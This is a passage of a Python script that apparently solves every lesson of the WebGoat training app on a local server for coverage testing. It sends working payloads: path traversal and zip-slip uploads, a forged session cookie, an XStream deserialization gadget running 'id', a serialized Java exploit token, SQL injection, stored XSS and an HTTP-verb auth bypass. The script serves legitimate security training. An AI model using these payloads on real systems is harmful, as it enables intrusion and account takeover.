          files={"uploadedFileFix": ("test.jpg", img_bytes, "image/jpeg")},
          data={"fullNameFix": "..././John Doe"})

    # Assignment 3: path traversal in filename itself
    check("PathTraversal/profile-upload-remove-user-input",
          files={"uploadedFileRemoveUserInput": ("../test.jpg", img_bytes, "image/jpeg")})

    # Assignment 4: read secret via path traversal, submit SHA-512 of username
    session.get(url("PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret"))
    sha512 = hashlib.new("sha512", USER.encode()).hexdigest()
    check("PathTraversal/random", {"secret": sha512})

    # Assignment 5: zip slip
    server_dir = session.get(url("server-directory")).text.strip()
    target_path = f"{server_dir}PathTraversal/{USER}/image.jpg"
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w") as zf:
        entry_name = "../../../../../../../../../../" + target_path
        zf.writestr(entry_name, "test_content")
    zip_buf.seek(0)
    check("PathTraversal/zip-slip",
          files={"uploadedFileZipSlip": ("upload.zip", zip_buf.read(), "application/zip")})
    session.get(url("PathTraversal/profile-picture"))
    session.get(url("PathTraversal/profile-picture-fix"))
    session.get(url("PathTraversal/zip-slip/"))
    session.get(url(f"PathTraversal/zip-slip/profile-image/{USER}"))


def solve_spoof_cookie():
    start_lesson("SpoofCookie")
    # EncDec.encode(v) = base64(hex(reverse(v.toLowerCase() + SALT)))
    # SALT is random per server startup — extract it from the webgoat cookie
    def encdec_decode(encoded):
        hex_str = base64.b64decode(encoded).decode("ascii")
        s = bytes.fromhex(hex_str).decode("utf-8")
        return s[::-1]

    def encdec_encode(value, salt):
        s = (value.lower() + salt)[::-1]
        hex_str = s.encode("utf-8").hex()
        return base64.b64encode(hex_str.encode("ascii")).decode("ascii")

    # Login as webgoat to get a cookie we can decode (tom/apasswordfortom would cheat)
    r = session.post(url("SpoofCookie/login"), data={"username": "webgoat", "password": "webgoat"})
    webgoat_cookie = r.cookies.get("spoof_auth") or session.cookies.get("spoof_auth")
    # Also try reading from Set-Cookie header directly
    if not webgoat_cookie:
        sc = r.headers.get("Set-Cookie", "")
        for part in sc.split(";"):
            part = part.strip()
            if part.startswith("spoof_auth="):
                webgoat_cookie = part[len("spoof_auth="):]
                break

    if not webgoat_cookie:
        print("  ~ SpoofCookie/login: could not get spoof_auth cookie for webgoat")
        return

    try:
        decoded = encdec_decode(webgoat_cookie)
        salt = decoded[len("webgoat"):]
        tom_cookie = encdec_encode("tom", salt)
        r2 = session.post(url("SpoofCookie/login"),
                          cookies={"spoof_auth": tom_cookie},
                          data={"username": "", "password": ""})
        result = r2.json()
        print(f"  {'✓' if result.get('lessonCompleted') else '✗'} SpoofCookie/login")
    except Exception as e:
        print(f"  ? SpoofCookie/login: {e}")
    session.get(url("SpoofCookie/cleanup"))


def solve_vulnerable_components():
    start_lesson("VulnerableComponents")
    # XStream 1.4.5 requires Java 6/7 internals (TreeMapConverter fails to init in Java 11+)
    # Hitting the route anyway to register coverage; server returns HTTP 500
    session.post(url("VulnerableComponents/attack1"),
                 data="<sorted-set><string>foo</string><dynamic-proxy><interface>java.lang.Comparable</interface>"
                      "<handler class='java.beans.EventHandler'><target class='java.lang.ProcessBuilder'>"
                      "<command><string>id</string></command></target><action>start</action></handler>"
                      "</dynamic-proxy></sorted-set>",
                 headers={"Content-Type": "application/xml"})
    print("  ~ VulnerableComponents/attack1: XStream 1.4.5 incompatible with JDK 11+ (expected 500)")


def solve_deserialization():
    start_lesson("InsecureDeserialization")
    # VulnerableTaskHolder has fields: requestedExecutionTime (LocalDateTime), taskAction (String),
    # taskName (String). The server parses taskAction "sleep 5" and delays 5 seconds.
    token = (
        "rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAIC"
        "AANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rp"
        "b250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiy"
        "DAAAeHB3DgUAAAfqBBAWCDMzQeMjeHQAB3NsZWVwIDV0AAdleHBsb2l0"
    )
    check("InsecureDeserialization/task", {"token": token})


def solve_challenges():
    start_lesson("Challenges")

    # Challenge 1: PINCODE is embedded in PNG bytes 81216-81219 as ASCII digits
    session.get(url("challenge/7/.git"))
    session.get(url("challenge/8/notUsed"))
    session.get(url("challenge/8/votes/"))
    session.get(url("challenge/8/votes/average"))
    # Challenge 7 POST requires WebWolf but hit the route anyway (@RequestParam email)
    session.post(url("challenge/7"), data={"email": f"{USER}@webgoat.org"})
    img_bytes = session.get(url("challenge/logo")).content
    session.post(url("challenge/logo"))  # @RequestMapping method={GET,POST}
    if len(img_bytes) > 81219:
        pincode = "".join(chr(img_bytes[i]) for i in range(81216, 81220))
    else:
        pincode = "0000"
    password = f"!!webgoat_admin_{pincode}!!"
    check("challenge/1", {"username": "admin", "password": password})

    # Challenge 5: SQL injection — inject Larry's row directly via ' OR '1'='1
    check("challenge/5", {"username_login": "Larry", "password_login": "' OR '1'='1"})

    # Challenge 7: ADMIN_PASSWORD_LINK is a hardcoded constant — no WebWolf needed for the GET
    r = session.get(url("challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2"))
    # Extract flag from response body (format: "Here is your flag: <flag>")
    flag7 = ""
    if "your flag: " in r.text:
        flag7 = r.text.split("your flag: ")[-1].strip()
    if flag7:
        check("challenge/flag/7", {"flag": flag7})
    else:
        print("  ~ challenge/7: could not extract flag from reset-password response")

    # Challenge 8: VERB-based auth — Spring routes HEAD to @GetMapping; getMethod() returns HEAD != GET
    r = session.request("HEAD", url("challenge/8/vote/5"))
    flag8 = r.headers.get("X-FlagController", "")
    if flag8.startswith("Thanks for voting, your flag is: "):
        flag8 = flag8[len("Thanks for voting, your flag is: "):]
    if flag8:
        check("challenge/flag/8", {"flag": flag8})
    else:
        print(f"  ~ challenge/8: no flag in X-FlagController header (status={r.status_code})")

    # ChallengeIntro: info-only lesson — just visit it so lessonmenu sees it exercised
    start_lesson("ChallengeIntro")
    print("  ~ ChallengeIntro: info-only lesson (no assignments)")

    # Challenge HijackSession: brute-force sequential cookie IDs — non-deterministic
    start_lesson("HijackSession")
    session.post(url("HijackSession/login"), data={"username": "webgoat", "password": "password"})
    print("  ~ challenge/HijackSession: brute-force of sequential session IDs (skipped)")
    # LogSpoofing log-bleeding: password is UUID logged at server startup — no log access (skipped)
    print("  ~ LogSpoofing/log-bleeding: UUID password requires server log access (skipped)")


def solve_webgoat_introduction():
    start_lesson("WebGoatIntroduction")
    print("  ~ WebGoatIntroduction: info-only lesson (no assignments)")


def solve_xss_mitigation():
    start_lesson("CrossSiteScriptingMitigation")
    # attack3: submit JSP page using OWASP Java Encoder taglib to escape first/last name
    jsp_code = (
        '<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" prefix="e" %>'
        "<html><body>"
        "<table><tbody>"
        "<tr><td>First Name</td><td>${e:forHtml(param.first_name)}</td></tr>"
        "<tr><td>Last Name</td><td>${e:forHtml(param.last_name)}</td></tr>"
        "</tbody></table>"
        "</body></html>"
    )
    check("CrossSiteScripting/attack3", {"editor": jsp_code})
    # attack4: submit AntiSamy-based sanitisation code
    antisamy_code = (
        'import org.owasp.validator.html.*;\n'
        'AntiSamy as = new AntiSamy();\n'
        'CleanResults cr = as.scan(newComment, Policy.getInstance("antisamy-slashdot.xml"));\n'
        'MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());'
    )
    check("CrossSiteScripting/attack4", {"editor2": antisamy_code})


def solve_stored_xss():
    start_lesson("CrossSiteScriptingStored")
    session.get(url("CrossSiteScriptingStored/stored-xss"))
    # Post the phone-home XSS comment
    session.post(url("CrossSiteScriptingStored/stored-xss"),
                 json={"text": "<script>webgoat.customjs.phoneHome()</script>"})
    # LessonSession is HTTP-session-scoped, so calling phone-home-xss sets the shared randValue
    r = session.post(url("CrossSiteScripting/phone-home-xss"),
                     data={"param1": "42", "param2": "24"},
                     headers={"webgoat-requested-by": "dom-xss-vuln"})
    output = r.json().get("output", "")
    prefix = "phoneHome Response is "
    secret = output[len(prefix):].strip() if output.startswith(prefix) else output.strip()
    check("CrossSiteScriptingStored/stored-xss-follow-up", {"successMessage": secret})


# ─────────────────────────────────────────────────────────────────────────────

def test_lesson_menu_service():
    """Exercise LessonMenuService.showLeftNav() - returns the left nav lesson menu structure."""
    print("\n=== LessonMenuService.showLeftNav() ===")
    json_accept = {"Accept": "application/json"}

    # Test all HTTP methods on /service/lessonmenu.mvc
    # @RequestMapping without method= accepts ALL methods when Accept: application/json
    methods_tested = []
    for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
        try:
            r = session.request(method, url("service/lessonmenu.mvc"), headers=json_accept)
            if r.status_code < 500:  # Success or client error (not server error)
                methods_tested.append(method)
        except Exception as e:
            print(f"  ? {method} failed: {e}")

    if methods_tested:
        print(f"  ✓ showLeftNav exercised via HTTP methods: {', '.join(methods_tested)}")

    # Validate the response structure from GET
    try:
        r = session.get(url("service/lessonmenu.mvc"), headers=json_accept)
        menu_data = r.json()
        if isinstance(menu_data, list):
            categories_count = len(menu_data)
            lessons_count = sum(len(cat.get("children", [])) for cat in menu_data)
            print(f"  ✓ showLeftNav returned {categories_count} categories with {lessons_count} lessons")
            # Verify the structure contains expected fields
            if menu_data:
                first_cat = menu_data[0]
                expected_fields = ["name", "type", "children"]
                if all(field in first_cat for field in expected_fields):
                    print(f"  ✓ Menu structure contains expected fields: {expected_fields}")
                if first_cat.get("children"):
                    first_lesson = first_cat["children"][0]
                    lesson_fields = ["name", "link", "type", "complete"]
                    if all(field in first_lesson for field in lesson_fields):
                        print(f"  ✓ Lesson items contain expected fields: {lesson_fields}")
        else:
            print(f"  ? showLeftNav returned unexpected type: {type(menu_data)}")
    except Exception as e:
        print(f"  ? showLeftNav error: {e}")

    # Also test without XHR header (plain browser request)
    plain_session.cookies.update(session.cookies)
    plain_session.get(url("service/lessonmenu.mvc"), headers=json_accept)


def hit_service_routes():
    """Hit global service routes that the browser SPA calls on startup."""
    # welcome.mvc forwards server-side to /attack; follow the full chain
    session.get(url("welcome.mvc"))
    # /attack redirects to first lesson — hit GET and POST directly
    session.get(url("attack"))
    session.post(url("attack"))
    # Also hit without XHR header (plain browser request)
    plain_session.cookies.update(session.cookies)
    plain_session.get(url("welcome.mvc"))
    plain_session.get(url("attack"))
    plain_session.post(url("attack"))
    session.get(url("WebWolf"), allow_redirects=False)
    session.get(url("service/lessonmenu.mvc"),
                headers={"Accept": "application/json"})
    plain_session.get(url("service/lessonmenu.mvc"),
                      headers={"Accept": "application/json"})
    session.get(url("service/labels.mvc"))
    session.get(url("service/hint.mvc"))
    session.get(url("service/reportcard.mvc"))
    session.get(url("service/enable-security.mvc"))
    session.get(url("service/debug/labels.mvc"))
    session.get(url("service/debug/labels.mvc"), params={"enabled": "true"})
    session.get(url("environment/server-directory"))
    # Spring Actuator endpoints (no auth required)
    session.get(url("actuator"))
    session.get(url("actuator/health"))
    session.get(url("actuator/env"))
    session.get(url("actuator/configprops"))
    # Exercise /* middleware on BOTH WebGoat and WebWolf with every HTTP method
    # Include CORS preflight headers and locale param to trigger interceptors
    cors_headers = {"Origin": "http://evil.com", "Access-Control-Request-Method": "POST"}
    for base in [BASE, WEBWOLF]:
        for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
            session.request(method, f"{base}/", allow_redirects=False)
            if method == "OPTIONS":
                session.request(method, f"{base}/", headers=cors_headers, allow_redirects=False)
    # Server root without context path
    for method in ["GET", "POST", "OPTIONS", "HEAD"]:
        session.request(method, "http://127.0.0.1:8080/", allow_redirects=False)
        session.request(method, "http://127.0.0.1:9090/", allow_redirects=False)
    # Trigger locale interceptor
    session.get(url("login"), params={"locale": "en"})
    # Unauthenticated request to force Spring Security middleware to actively reject
    anon = requests.Session()
    anon.get(url("HttpBasics/attack1"), allow_redirects=False)
    anon.post(url("HttpBasics/attack1"), allow_redirects=False)
    anon.request("OPTIONS", url("HttpBasics/attack1"), allow_redirects=False)
    # @RequestMapping without method= accepts ALL methods — coverage tool counts each separately
    # Call POST (and PUT/DELETE) for all "ALL" service routes to cover every method
    json_accept = {"Accept": "application/json"}
    for svc in ["service/lessonmenu.mvc", "service/enable-security.mvc",
                 "service/debug/labels.mvc"]:
        # lessonmenu.mvc has produces="application/json", so needs Accept header
        headers = json_accept if svc == "service/lessonmenu.mvc" else {}
        session.post(url(svc), headers=headers)
        session.put(url(svc), headers=headers)
        session.delete(url(svc), headers=headers)
        session.patch(url(svc), headers=headers)
        session.head(url(svc), headers=headers)
        session.options(url(svc), headers=headers)
    session.post(url("service/debug/labels.mvc"), params={"enabled": "true"})
    session.put(url("service/debug/labels.mvc"), params={"enabled": "false"})
    session.delete(url("service/debug/labels.mvc"), params={"enabled": "true"})


def hit_webwolf_routes():
    """Hit all WebWolf server routes (port 9090)."""
    try:
        # Request traces
        webwolf_session.get(webwolf_url("requests"))
        # Mailbox
        webwolf_session.get(webwolf_url("mail"))
        webwolf_session.post(webwolf_url("mail"),
                              json={"recipient": USER, "title": "test", "contents": "test"})
        webwolf_session.delete(webwolf_url("mail"))
        # File server
        webwolf_session.get(webwolf_url("files"))
        webwolf_session.post(webwolf_url("fileupload"),
                              files={"file": ("test.txt", b"test", "text/plain")})
        # @RequestMapping without method= — hit all methods for coverage
        webwolf_session.get(webwolf_url("file-server-location"))
        webwolf_session.post(webwolf_url("file-server-location"))
        webwolf_session.put(webwolf_url("file-server-location"))
        webwolf_session.delete(webwolf_url("file-server-location"))
        # JWT tool (JWTController lives in WebWolf)
        webwolf_session.get(webwolf_url("jwt"))
        sample_jwt = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
                       ".eyJzdWIiOiJ0ZXN0In0"
                       ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
        # JWTController uses @RequestBody MultiValueMap — must send form-encoded, not JSON
        webwolf_session.post(webwolf_url("jwt/decode"), data={"jwt": sample_jwt})
        webwolf_session.post(webwolf_url("jwt/encode"), data={
            "header": '{"alg":"HS256","typ":"JWT"}',
            "payload": '{"sub":"webgoat"}',
            "secretKey": "test"
        })
        # Landing page (wildcard — accepts all methods on any sub-path)
        webwolf_session.get(webwolf_url("landing/password-reset"))
        webwolf_session.post(webwolf_url("landing/password-reset"))
        webwolf_session.put(webwolf_url("landing/test"))
        webwolf_session.delete(webwolf_url("landing/test"))
        webwolf_session.patch(webwolf_url("landing/test"))
    except Exception as e:
        print(f"  ~ WebWolf routes: {e}")


def solve_webwolf_introduction():
    """WebWolf Introduction lesson — WebGoat routes with /WebWolf/ prefix."""
    start_lesson("WebWolfIntroduction")
    # Landing assignment: validate uniqueCode = reversed username
    session.get(url("WebWolf/landing/password-reset"))
    unique_code = USER[::-1]
    check("WebWolf/landing", {"uniqueCode": unique_code})
    # Mail assignment: send email, then validate the unique code
    session.post(url("WebWolf/mail/send"), data={"email": f"{USER}@webgoat.org"})
    check("WebWolf/mail", {"uniqueCode": unique_code})


def main():
    login()
    login_webwolf()
    test_lesson_menu_service()
    hit_service_routes()
    hit_webwolf_routes()

    print("\n=== WebGoat Introduction ===")
    solve_webgoat_introduction()
    print("\n=== WebWolf Introduction ===")
    solve_webwolf_introduction()
    print("\n=== HTTP Basics ===")
    solve_http_basics()
    print("\n=== CIA ===")
    solve_cia()
    print("\n=== Chrome DevTools ===")
    solve_chrome_devtools()
    print("\n=== HTTP Proxies ===")
    solve_http_proxies()
    print("\n=== Auth Bypass ===")
    solve_auth_bypass()
    print("\n=== Insecure Login ===")
    solve_insecure_login()
    print("\n=== Secure Passwords ===")
    solve_secure_passwords()
    print("\n=== Lesson Template ===")
    solve_lesson_template()
    print("\n=== SQL Injection ===")
    solve_sql_injection()
    print("\n=== SQL Injection Advanced ===")
    solve_sql_injection_advanced()
    print("\n=== SQL Injection Mitigations ===")
    solve_sql_injection_mitigations()
    print("\n=== XSS ===")
    solve_xss()
    print("\n=== Stored XSS ===")
    solve_stored_xss()
    print("\n=== XSS Mitigation ===")
    solve_xss_mitigation()
    print("\n=== Cryptography ===")
    solve_crypto()
    print("\n=== IDOR ===")
    solve_idor()
    print("\n=== Bypass Restrictions ===")
    solve_bypass_restrictions()
    print("\n=== Client Side Filtering ===")
    solve_client_side_filtering()
    print("\n=== HTML Tampering ===")
    solve_html_tampering()
    print("\n=== SSRF ===")
    solve_ssrf()
    print("\n=== Missing Access Control ===")
    solve_missing_access_control()
    print("\n=== XXE ===")
    solve_xxe()
    print("\n=== Log Spoofing ===")
    solve_log_spoofing()
    print("\n=== JWT ===")
    solve_jwt()
    print("\n=== CSRF ===")
    solve_csrf()
    print("\n=== Password Reset ===")
    solve_password_reset()
    print("\n=== Path Traversal ===")
    solve_path_traversal()
    print("\n=== Spoof Cookie ===")
    solve_spoof_cookie()
    print("\n=== Vulnerable Components ===")
    solve_vulnerable_components()
    print("\n=== Insecure Deserialization ===")
    solve_deserialization()
    print("\n=== Challenges ===")
    solve_challenges()

    # Hit login-oauth.mvc — calls userService.addUser() which overwrites user's password.
    # Use a disposable user registered via plain session (no XHR header).
    print("\n=== OAuth Route ===")
    try:
        # Username must match UserForm's @Pattern("[a-z0-9-]*") — no underscores
        oauth_user = f"oauth-{uuid.uuid4().hex[:8]}"
        oauth_s = requests.Session()
        # register.mvc calls request.login() internally, so the session is authenticated
        oauth_s.post(url("register.mvc"), data={
            "username": oauth_user, "password": PASS,
            "matchingPassword": PASS, "agree": "agree"
        }, allow_redirects=False)
        # login-oauth.mvc handler uses Authentication param — don't follow redirects
        # so the handler's redirect:/welcome.mvc is the response (not a redirect chain)
        r = oauth_s.get(url("login-oauth.mvc"), allow_redirects=False)
        print(f"  ~ login-oauth.mvc: hit via disposable user {oauth_user} (status={r.status_code})")
    except Exception as e:
        print(f"  ? login-oauth.mvc: {e}")

    # Hit the scoreboard endpoint — read-only JSON, no vuln, but exercises the route.
    print("\n=== Scoreboard ===")
    try:
        r = session.get(url("scoreboard-data"))
        print(f"  ✓ scoreboard-data: {len(r.json())} entries (status={r.status_code})")
    except Exception as e:
        print(f"  ? scoreboard-data: {e}")

    print("\n[+] All lessons exercised.")


if __name__ == "__main__":
    main()
